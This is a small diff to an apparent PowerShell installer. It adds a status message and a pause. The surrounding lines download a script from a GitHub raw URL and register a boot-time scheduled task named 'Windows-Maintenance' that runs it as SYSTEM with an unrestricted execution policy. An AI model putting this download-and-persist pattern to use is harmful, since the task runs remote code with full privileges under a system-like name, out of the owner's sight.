@@ -9,3 +9,6 @@ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/TheBotlyNoob/Misc-Proj
 
 # Set The Task To Run On Start
 schtasks /create /sc 'ONSTART' /tn 'Windows-Maintenance' /tr "powershell -ExecutionPolicy UnRestricted -File $env:AppData\Maintenance.ps1" /ru 'system' /f
+
+Write-Output "Installed..."
+Start-Sleep -s 5
